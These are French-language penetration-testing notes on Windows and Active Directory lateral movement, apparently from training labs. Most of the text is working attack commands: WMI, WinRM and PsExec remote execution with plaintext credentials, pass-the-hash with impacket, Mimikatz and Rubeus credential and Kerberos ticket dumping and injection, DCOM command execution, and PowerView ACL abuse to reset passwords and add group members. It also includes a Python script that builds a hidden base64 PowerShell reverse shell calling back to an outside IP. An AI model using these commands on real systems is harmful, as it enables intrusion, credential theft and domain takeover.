# WMI et WinRM
## WMI
Windows  Management Instrumentation (WMI). Orienté objet. Créé des processus. 
Utilise RPC sur port 135 et des ports haut pour les données de sessions.
Requière creds d'un administrateur locale

## CMD

```
wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc"
```

## Powershell
``` powershell
$username = 'joe';
$password = 'Flowers1';
$target_ip = '172.16.234.10';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
$options = New-CimSessionOption -Protocol DCOM
$session = New-Cimsession -ComputerName $target_ip -Credential $credential -SessionOption $Options 
$command = 'calc';
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```
Encode en base64 un reverse shell
``` powershell
import sys
import base64

ip = "192.168.45.196"
port = 443
payload = '$client = New-Object System.Net.Sockets.TCPClient("%s",%i);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' % (ip,port)

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)
```


## WinRM
Alternative à WMI, Utilise message XML par HTTP (5986) et HTTPS (5985)
différents utilitaires
### WinRS
```
winrs -r:files04 -u:jen -p:Nexus123!  "cmd /c hostname & whoami"
```
### Powershell Remoting
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ powershell
$username = 'jen';
$password = 'Nexus123!';
$target_ip = '192.168.202.72';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
New-PSSession -ComputerName $target_ip -Credential $credential
#pour interagir avec la session:
Enter-PSSession 1
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


# PSExec
* Utilisateur doit être **admin locale** sur la machine cible
* Le partage **ADMIN$** doit être disponible
* Partage de fichiers et imprimantes doit être activé

Fait parti de la suite SysInternals
Disponible en version web: https://learn.microsoft.com/en-us/sysinternals/#sysinternals-live

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
./PsExec64.exe -i \\FILES04 -u corp\jen -p Nexus123! cmd
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


# Pass the hash
* Pas sous Kerberos, seulement NTLM
* Requière connexion SMB
* Utilisateur doit être admin locale sur la machine cible ou AD admin
* Le partage ADMIN$ doit être disponible
* Partage de fichiers et imprimantes doit être activé

Différent outils existent

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.202.73
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


# Overpass the hash
Créer notre ticket sans passer par le DC
1. Utiliser Mimikatz pour extraire les clefs d'encriptions `AES256_HMAC` ou `RC4_HMAC`.
```cmd-session
privilege::debug
sekurlsa::ekeys
```
2. Utiliser Mimikatz ou Rubeus pour générer notre ticket
	* Mimikatz (Admin seulement)
	 ```sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell```

	* Rubeus
	`Rubeus.exe  asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap`
	
* **whoami** donnera le nom du premier compte utilisé puisqu'il ne vérifie pas les tickets Kerberos.
* **klist** n'aura pas de ticket puisque nous ne sommes pas authentifiés.
s'authentifier pour **générer un ticket** en se connectant à un partage 
```
net use \\files04
```
 Pourrait être autre chose aussi
Ensuite on peut utiliser n'importequel outil qui utilise l'authentification Kerberos comme PSExec

# Pass the ticket
TGS et TGT peut être exporté et réutilisé vers d'autres machines. Il est possible d'extraire les tickets de son compte seulement ou de tout si admin local
## Exportation
### Mimikatz
``` powershell
privilege::debug
#Crée des fichiers .kirbi par billet
sekurlsa::tickets /export
```
### Rubeus
`Rubeus.exe dump /nowrap`
## Génération
* Voir Overpass the hash ci-haut
* Convertir un ticket en base64
`[Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))`
## Importation
### Rubeus
```shell
#importation du disque
Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
#Injection par base64
Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID<SNIP>
#Génération et injection
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
```
### Mimikatz
``` shell
kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
```
On peut aussi utiliser `misc::cmd` pour lancer une nouvelle fenêtre au lieu d'injecter dans la session courante.

# Powershell Remoting et pass the ticket
Powershell remoting permet de se connecter à distance. Port TCP/5985 et TCP/5986. Doit être Admin, membre de Remote Management Users ou permissions explicites pour powershell remoting.
## Mimikatz
```powershell
privilege::debug
kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
exit
Enter-PSSession -ComputerName DC01
```
## Rubeus
`createnetonly` crée un processus temporaire caché pour éviter de poluer la sessions actuelle. Équivalent de `runas /netonly`. `/show` permet de voir le processus qui est caché par défaut.
```powershell
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
#nouvelle fenêtre
Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
powershell
Enter-PSSession -ComputerName DC01
```

# DCOM
Component Object Model (COM) extention permet aux logiciels d'interagir entre eux. Distributed Component Object Model est une extention pour interagir sur un réseau
Abuse Microsoft Management Console (MMC) COM application. Expose ExecuteShellCommand.
Doit avoir les droits d'exécuter (**sur machine locale ou distante?**)
Utilise **RPC** sur port **145**, requière **administrateur local**

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ powershell
$target_ip = "172.16.190.10";
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1",$target_ip))
$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
#ou reverseshell
$payload = "powershell -nop -w hidden -e JABjA...="
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,$payload,"7")

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

# Changer mot de passe

```powershell
$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword) 
$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force

Import-Module .\PowerView.ps1
Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
```

# Ajout de membre à un groupe
```powershell
$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
#confirmer
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName
```
Retirer
```powershell
Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose
```
# Ajout d'un SPN à un usager
```powershell
Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
```
Retirer
```powershell
Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose
```


# Double Hop
Tickets non conservés quand on saute à travers plusieurs hôtes avec divers protocoles qui n'utilisent pas Kerberos. Notamment WinRM.
### PSCredential Object
créer un objet powershell avec les creds pour le passer à une application
```powershell
$SecPassword = ConvertTo-SecureString '!qazXSW@'
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\backupadm', $SecPassword)
#powerview
get-domainuser -spn -credential $Cred | select samaccountname
```

### PSSession Configuration
Requière un hôte join au domaine ou une machine windows
```powershell
#connexion
Enter-PSSession -ComputerName ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL -Credential inlanefreight\backupadm
#Enregistrer la session
Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential inlanefreight\backupadm
#Redémarrer la session
Restart-Service WinRM
#Reconnexion
Enter-PSSession -ComputerName ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL -Credential inlanefreight\backupadm
```